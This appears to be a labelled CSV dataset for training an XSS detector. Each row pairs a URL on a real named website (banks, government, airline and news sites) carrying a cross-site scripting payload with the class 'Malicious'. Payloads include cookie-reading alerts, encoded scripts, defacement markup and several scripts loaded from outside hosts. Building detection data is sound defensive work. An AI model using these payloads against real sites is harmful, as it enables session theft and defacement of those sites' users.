Payloads,Class
http://www.autoweb.com/content/research/index.cfm?action=search&amp;search=&quot;&gt;&lt;script&gt;alert('xss')&lt;/scrip<br>t&gt;,Malicious
http://www.lettersharing.org.uk/search.asp?searwords=%22%3e%27%3e%3cscript%3ealert(123)%3c%2fscript%<br>3e&amp;send=search&amp;search=0&amp;match=0,Malicious
http://www.isp.gov.ve/phpmyadmin/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%<br>3e,Malicious
http://www.benq.com.br/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.zona6.it/bmachine/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3<br>ealert(document.cookie)%3b%3c/script%3e,Malicious
http://www.bandpingredients.com/newsdetail.php?id=%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/scri<br>pt%3e,Malicious
http://ss.iodata.jp/pio/matchbody?keyword=hello_xss_by_kusomiso.com&amp;release=19'%3e%22%3e%3cscript/sr<br>c=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.net.hr/search_rd.jsp?ct=archive&amp;type=search&amp;artperpage=15&amp;q=%22%3e%3cscript%3ealert%281%2<br>9%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27<br>kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%28101<br>11%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1<br>%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%<br>3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;suffix=&amp;site=&amp;pagenum=null&amp;action=search,Malicious
http://store.steampowered.com/news/?filter=updates&amp;appids=%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
http://edda.realmind.net/tt/index.php?setdate=200612%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72<br>%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%<br>30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2<br>c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.gernikaclub.com/default2.asp?page=articulos/articuloprincipal16.asp&amp;title=&lt;script&gt;alert(&quot;<br>scriptorium(turkey)hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.laredoute-magazines.fr/laredoute/search.asp?search_string=&quot;&gt;'&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;&lt;iframe src=http://xssed.com&gt;&lt;/iframe&gt;,Malicious
http://www.ajp.com/title.php?ititlenum=4286&amp;artistid=--%3e%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e,Malicious
http://www.tm.net.my/tmnet2006/contents/online/eregistration.cfm?ms=5&amp;type=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert<br>('=xssbydt=')%3b&lt;/script&gt;,Malicious
http://www.elanco.org/calendar/search.html?q=%22%3cscript%3ealert(%22found%20by%20hotpockets%20of%20<br>backslashsecurity.org%22)%3c/script%3e,Malicious
http://nordic.benq-eu.com/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.regnow.com/signup/affiliate?auto_vendor=wawa%22%3e%3cscript%3ealert(123)%3c/script%3e,Malicious
https://channel.pandasecurity.com/app/pages/partner%20program.aspx?language=%22%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28%22arman%20ires%20digital%20boys%20underground%20http://xssed.com%22%29%3c%2fscript%3e,Malicious
http://www.bnamericas.com/freetrial_1.jsp?idioma=i&amp;source=0&amp;sector=0&amp;orgn=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)<br>&lt;/script&gt;,Malicious
https://www.icq.com/password/error.php?email=&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&amp;err=108,Malicious
http://www.hotspringsfsbos.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.usabadminton.org/page.asp?page=usa%20badminton%20history%27%22%3e%3c/title%3e%3cscript%3e<br>alert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.dearjohn.idv.tw/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3<br>e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c<br>%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%<br>31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
"http://www.logicool.co.jp/index.cfm/footer/subscription_management/&amp;cl=jp,ja%22%3e'%3e%3c/script%3e%<br>3cscript%3ealert(%22xss%22)%3c/script%3e",Malicious
http://concerto-moon.net/orz2ch/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20ku<br>somiso.com%22)%3c/script%3e,Malicious
http://eol.jsc.nasa.gov/scripts/search/websearch.pl?word=%3cmarquee%3e%3ch1%3ekaksii%20was%20here%3c<br>/h1%3e%3c/marquee%3e%3cdiv%20align=center%3e%20%3cfont%20size=4%3e%3ctextarea%20name=1%20cols=100%20<br>rows=1000%20id=1%3ekaksii%20was%20here%3c/textarea%3e%3c/font%3e%3c/div%3e%3cnoscript%3e%3cplaintext<br>%3e,Malicious
http://www.realist.gen.tr/arama/?nedir=toplist=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;fujked&lt;/<br>h1&gt;,Malicious
http://bityurl.com/html/index_done.php?url=&lt;script&gt;alert(1);&lt;/script&gt;&amp;short_url=&lt;script&gt;alert(1);&lt;/s<br>cript&gt;,Malicious
http://www.radioparties.com/djiframe.aspx?location=request&amp;pageheader=univ%20of%20oregon%20fred%20me<br>yer%20event%20guest%20request%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%<br>3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://openfeint.com/ios?search[order]=&amp;search[title_like]=%3cscript%3ealert%28document.cookie%29%0a<br>%3c/script%3e&amp;search[ios_is]=1&amp;commit=search,Malicious
https://jobopportunities.ferroviedellostato.it/curr-on-line/initcurrservice?codscta=0004.%22%3cscrip<br>t%3ealert(123)%3c/script%3e,Malicious
http://www.vpb.lt/index.php?c=paieska%2findex.php&amp;q=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e,Malicious
http://market.mynet.com/market/arkadasim/secim2.asp?refurl=&quot;&gt;&lt;body onload=alert(&quot;starext&quot;)&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0; url=http://lht.by.ru/uyar1.html&quot;&gt;,Malicious
"http://g1.globo.com/noticias/0,,rs0-5597,00.html?q=%22%3e'%3e%3cscript%3ealert(string.fromcharcode(8<br>3,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://fplayer.youtubech.com/?q=%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,Malicious
http://www.stickam.com/searchmedia.do?searchfor=%27%22%3e%3e%3cmarquee%3e%3ch1%3e%3cstrong%3ecueball<br>r%3c%2fstrong%3e%3c%2fh1%3e%3c%2fmarquee%3e&amp;mediatype=video&amp;searchby=text&amp;submit=search,Malicious
http://www.integrativetherapy.com/en/articles.php?id=32%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://notrefamille.femmes.fr.msn.com/v2/boutique/produit-prenom.asp?pastrouve=true&amp;prenom=&quot;&gt;&lt;body+o<br>nload=alert(&quot;starext&quot;)&gt;&lt;marquee&gt;&lt;h1&gt;st@rext&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bullmitz.co.uk/igallery34/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.nsdaily.com/auctionsite/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://theworldsearch.brothersoft.com/result.php?cx=011890932829907930945%3ajynxbnokunu%22%3e%3cscri<br>pt%3ealert%28document.cookie%29%3c/script%3e&amp;type=1&amp;cof=forid%3a11&amp;ie=utf-8&amp;q=%3cscript%3ealert%281%<br>29%3c%2fscript%3e&amp;sa=search&amp;siteurl=theworldsearch.brothersoft.com%252f&amp;siteurl=theworldsearch.broth<br>ersoft.com%252f,Malicious
http://news.naver.com/sports/index.nhn?category=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.buyskool.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scr<br>ipt&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.kawasaki.com.mx/motos.asp?categoria=deportivas&amp;modelo=zx600p8f&amp;y=2008&amp;i=3&amp;desc=%27%22%3e%<br>3c/title%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.eurohome.dk/search.php?lg=us&amp;p=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://auto.fi.msn.com/page.php?page_id=2&news_id=200900903&p=%22%3e%3cscript%3ealert%28/xssed%20by%20rohit/%29%3c/script%3e,Malicious
http://www.avira.de/de/pages/404.html?url=%3c/script%3e%3cscript%3ealert(/totalschaden/)%3c/script%3<br>e,Malicious
http://www.njliji.com/search.asp?field=title&amp;bigclassname=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c<br>%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%<br>29%3c%2f%73%63%72%69%70%74%3e%0a65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;su<br>bmit=%cb%d1%cb%f7,Malicious
http://www.incil.com/incilbbs/check_user_id.php?user_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://bankingportal.sparkasse-freiburg.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.d<br>e%3e,Malicious
"http://www.whatsapp.com/payments/pay.php?phone=<script>alert(""edgard was here..."")</script>",Malicious
"http://www.nero.com/eng/search.php?searchfield=%27%22%3cscript%3ealert%28string.fromcharcode(88,83,8<br>3)%29%3c/script%3e",Malicious
http://fenopy.com/?keyword=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%61%7a%65%64%3f%<br>20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e&amp;select=0&amp;order=0&amp;sort=0&amp;minsize=&amp;maxs<br>ize=&amp;search.x=0&amp;search.y=0,Malicious
http://progh2.cug.kr/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%7<br>0%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32<br>%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%<br>31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious
http://tools.neb.com/inbase/intein.php?name=gob+dnae}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss<br>/.source));%3c/script%3e,Malicious
http://www.xoox.co.il/programs/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.fwzone.net/search.asp?action=search&amp;submit=go&amp;stypeid=25&amp;searchstring=&amp;offset=&quot;&gt;&lt;script&gt;a<br>lert(&quot;cyber&quot;)&lt;/script&gt;,Malicious
http://www.xtratime.org/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://sabah.com.tr/anket/popup.php?action=results&amp;poll_ident=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
http://www.jobmire.com/ad_search.php?search=1&amp;search_form=right&amp;ad_sector=0&amp;ad_region=0&amp;keyword=%3cs<br>cript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fma<br>rquee%3e&amp;x=0&amp;y=0,Malicious
http://www.photoarabi.com/pix/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,Malicious
http://www.austintamilsangam.org/modules/xoogle/index.php?query=%22%3e%3c%2fa%3e%3cscript%3ealert%28<br>document.cookie%29%3b%3c%2fscript%3e&amp;search=web&amp;lr=lang_zh-tw,Malicious
http://search.maplesoft.com/search?access=p&amp;entqr=0&amp;output=xml_no_dtd&amp;sort=date%3ad%3al%3ad1&amp;ud=1&amp;ie<br>=utf-8&amp;client=default_frontend&amp;oe=utf-8&amp;proxystylesheet=default_frontend&amp;q=%3cscript%3ealert(documen<br>t.cookie)%3c/script%3e&amp;ip=80.58.205.98&amp;filter=p,Malicious
http://www.byteandswitch.com/boards/login.asp?start=yes&amp;errstr=%22%3e%3cscript%3ealert%28document%2e<br>cookie%29%3c%2fscript%3e&amp;nexturl=%2flibrary%2easp%3fshow%5ftype%3dwp%26view%5ftype%3dbrowse,Malicious
http://lib.cet.ac.il/pages/sub.asp?item=246}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source)<br>);%3c/script%3e,Malicious
http://www.mnsportingclays.org/gallery/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.nod32-a.com/compras/enlinea/index.php?operacion=2&amp;id=1&amp;compra=1=%22%3e%3cscript%3ealert('<br>www.nullcode.com.ar%20-%20hunting%20security%20bugs!')%3c/script%3e,Malicious
http://www.mercadolibre.com.co/colombia/ml/l_user.main?as_filtro_id=certified_usr&as_nickname=%a0&as_pcia_id=%3e%22%3e%3cscript%3ealert%28%27xss%27%29;%3c/script%3e,Malicious
http://www.sykesanderson.com//site_search.asp?search=%3e%22%3e%3cscript%3ealert%28%27xss%20-%20vuln%<br>27%29%3c%2fscript%3e,Malicious
http://www.disneydvd.fr/search.jsp?type=titre&amp;valeur=%22%3e%3cscript%3ealert(1337)%3b%3c%2fscript%3e<br>%3cmarquee%3e%3ch1%3exss+by+warvector+%3d)%3c%2fh1%3e%3c%2fmarquee%3e&amp;ok_search=,Malicious
http://www.bunkerworld.com/search.html?q=graha%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://to.gov.br/busca/%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.freelance.com/__c125675b0014f649.nsf/pages/2002freelancers?opendocument&amp;opensection=--%3e<br>%22%3e%3cscript%3ealert%3cscript%3ealert(1337)%3c/script%3e(1337)%3cscript%3ealert(1337)%3c/script%3<br>e%3c/script%3e,Malicious
http://es.test.games.yahoo.net/email/emailarticle.asp?url=&quot;&gt;&lt;script&gt;alert(/nemessis-www.rstzone.org/<br>)&lt;/script&gt;&amp;title=%bfqu%e9+son+los+sof%3f,Malicious
http://www.shanachie.com/search/search.cgi?q=%22%3e%3cscript%3ealert(%22pwnd%20for%20big-h%20(;%22)%<br>3c/script%3e,Malicious
http://www.gpo.gov/gpo/sitesearch/homedosite.action?st=%22%3e%3cscript%3ealert%28document.cookie%29%<br>3c/script%3e,Malicious
https://hotels.qantas.com.au/readyrooms/popups/emailafriend.jsp?site=qantas&amp;code=4190conraool&amp;hoteli<br>d=4190conraool&amp;city=ool%22/%3e%3cscript%3ealert%281%29;%3c/script%3e,Malicious
http://www.hbly.gov.cn/search/searchcontroller?searchword=%ba%fe%b1%b1%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.parliament.sa.gov.au/searchresults.aspx?keywords=%3cscript%3ealert('nullflow')%3b%3c%2fsc<br>ript%3e,Malicious
http://ramazan.milliyet.com.tr/imsakiye.asp?sehir=%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://yaracuy.tsj.gov.ve/noticias/noticia_detallada.asp?id=%22%3e%3cscript%3ealert(/xssed/);%3c/scr<br>ipt%3e,Malicious
http://kontrolle.gv.at/htdig/htsearch.php?config=rh&amp;method=and&amp;matchesperpage=20&amp;ebene%5b0%5d=alle&amp;s<br>ort=score&amp;bundesland%5b0%5d=burgenland&amp;bundesland%5b1%5d=steiermark&amp;bundesland%5b2%5d=kaernten&amp;bunde<br>sland%5b3%5d=tirol&amp;bundesland%5b4%5d=niederoesterreich&amp;bundesland%5b5%5d=vorarlberg&amp;bundesland%5b6%5<br>d=oberoesterreich&amp;bundesland%5b7%5d=wien&amp;bundesland%5b8%5d=salzburg&amp;words=&lt;script&gt;alert(123)&lt;/script<br>&gt;&amp;submit.x=10&amp;submit.y=14,Malicious
http://beykozhem.gov.tr/blog.asp?id=25&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;liont<br>urk&lt;/h1&gt;&lt;/marquee&gt;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'&quot;&gt;&lt;marquee&gt;&lt;h1&gt;lionturk&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://yp.sina.com/article_detail.php?aid=82%%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%<br>53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29%29%3c%2f%73%6<br>3%72%69%70%74%3e%0a,Malicious
http://www.nic.ba/stream/press/index.php/%27%22%3e%3cscript%3ealert%28%22securitylab.ir%22%29;%3c/script%3e,Malicious
http://www.bbc.co.uk/cgi-bin/worldservice/psims/schedulesdt.cgi?pg=&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.jouwnieuws.nl/%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.motorsale.ru/search/?searchtxt=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.icq.com/groups/index.php?act=view_topic&amp;group_id=550&amp;topic_id=120307&amp;forum_page=&quot;&gt;&lt;script<br>&gt;alert('s0m.ph');&lt;/script&gt;,Malicious
"http://map.harvard.edu/infomap_search.cfm?tx0=';alert(string.fromcharcode(84,69,83,84,69))//\';alert<br>(string.fromcharcode(84,69,83,84,69))//%22;alert(string.fromcharcode(84,69,83,84,69))//\%22;alert(st<br>ring.fromcharcode(84,69,83,84,69))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcod<br>e(84,69,83,84,69))%3c/script%3e",Malicious
http://www.happytreefriends.com/?s=%22%3e%3cscript%3ealert%28test%29%3c/script%3e%20%3cmarquee%20beh<br>avior=%22alternate%22%20direction=%22right%22%20bgcolor=%22white%22%3ei%20love%20music...romania..in<br>security.ro..by%20sony%3c/marquee%3e;%3cimg%20src=%22http://i55.tinypic.com/dy3brm.gif%22%3e;%3cifra<br>me%20src%20=http://www.youtube.com/watch?v=xxpl8xicjrc%22%20width=%22600%22%20height=%22600%22%20\%3<br>e%3c/div%3e,Malicious
http://www.daav-online.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://bands.army.mil/news/default.asp?newsid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.capoliticalnews.com/s/spip.php?action=cookie&amp;url=%22'/%3e%3cscript%3ealert('hello%20the%2<br>0rat')%3c/script%3e,Malicious
http://job.surfandbiz.com/search?q=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3<br>ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;sa=rechercher,Malicious
http://alistdirectory.com/index.php?q=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
https://www.aa.com/login/loginaccess.do?anchorevent=false&amp;previouspage=/homepage.do&amp;uri='%22%3e%3cbo<br>dy%20onload=%22alert(1)%22%3e&amp;previouspage=/homepage.do&amp;anchorevent=false&amp;uri=/login/loginaccess.do&amp;<br>v_locale=en_us&amp;v_mobileuaflag=aa,Malicious
http://search.verisign.com/cs.html?url=%0alocation:javascript:%0a%0a%3cscript%3ealert(/pwnd/)%3c/scr<br>ipt%3e,Malicious
http://www.ncbi.nlm.nih.gov/unigene/clust.cgi?org=%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://medya.webim.eu/?k=51&amp;a=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious
http://mrsrl.stanford.edu/seminar/main.php?mode=2%22%3e%3cscript%3ealert%28document.cookie%29%3c/scr<br>ipt%3e,Malicious
http://news.newhua.com/search.asp?types=news&amp;condition=title&amp;keyword=&quot;&gt;&lt;script&gt;alert('cyber//35r4-f0<br>r3v3r')&lt;/script&gt;,Malicious
http://g2.wnd.com/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.fdsindh.gov.pk/site/search.php?keyword=%22%3e%3cscript%3ealert(document.cookie)%3c/script<br>%3e%27%22%3e%3cmarquee%3e%3ch1%3e-xss%20by%20th3%20rdx-%3c/h1%3e%3c/marquee%3e,Malicious
http://infostore.org/search?s=%22%3e%27%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27&amp;type=0,Malicious
http://www.forgetsecurity.es/products/screenshots.php?lang=%22%3e%3ciframe%20onload=alert%28/xss/%29%3e,Malicious
http://www.exblog.jp/tb_valley.asp?slt=tb&amp;srl=151&amp;knd=20%'%3e%22%3e%3cscript/src=http://kusomiso.com<br>/xss.js%3e%3c/script%3e,Malicious
http://www-cgi.hrz.tu-darmstadt.de/harvest/cgi-bin/nph-search.cgi?broker=%22%3e%3cscript%3ealert(%22<br>pwnd%20for%20big-h%20(;%22)%3c/script%3e,Malicious
http://cruises.travel.yahoo.net/s/c/results.asp?porttype=a&amp;stype=p&amp;ptype=c&amp;type=c&amp;port=%22%3e%3cscri<br>pt%3ealert(1)%3c/script%3e,Malicious
http://www.fff.fr/flash/video/affiche.php?fichier=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/th<br>irdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.mafiaturk.com/kayit.php?ref=&quot;&gt;&lt;script&gt;alert(/i%20understand%20you%20don't%20want%20me/)&lt;/<br>script&gt;,Malicious
http://www.mrrc.de/aktuell/index.php?start=20or%20%3cscript%3ealert(10);%3c/script%3e=%201&amp;first=1,Malicious
http://news.lycos.com/?itemid=77024312&amp;ctid=1&amp;catid=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%20by%<br>20trex&lt;/h1&gt;,Malicious
https://bankingportal.sparkasse-koblenz.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de<br>%3e,Malicious
http://www.admin.cam.ac.uk/news/sendmail.cgi?art=2008061201&amp;email=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;me<br>ta content=&quot;,Malicious
http://www.travelshopturkey.com/_pic/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://images.statelibrary.tas.gov.au/search/titlesearch.asp?title=&lt;script&gt;alert(&quot;cyber_thief(turkey<br>)%20nationteam.com&quot;)&lt;/script&gt;,Malicious
http://creditcardforum.com/finance-charges-apr-compare/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie<br>);&lt;/script&gt;,Malicious
http://locoboard.jp/search.php?mode=search&amp;id=support&amp;word=%22%3e%3cimg+src%3dno_such_icon+onerror%3<br>dalert%28document.cookie%29%3b%3e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;type=or&amp;pn<br>=20,Malicious
http://asyafinans.com.tr/arama.jsp?keyword=%22%3e%3cscript+src%3dhttp%3a%2f%2fsinek.pandela.net%2fj.<br>js%3e%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://ww1.rtp.pt/multimedia/index.php?pesquisa=%3e%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.mrecic.gov.ar/portal/repre_argentinas/plantilla.php?id=%22%3e%3cscript%3ealert%28/ar3sw0r<br>med/%29;%3c/script%3e,Malicious
http://www.un.org/works/sub5.asp?lang=en&amp;id=%3chtml%3e%3cbody%3e%3cscript%20src=http://www.securityl<br>ab.ru/test/un.js%3e%3c/script%3e,Malicious
http://www.fossilien24.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
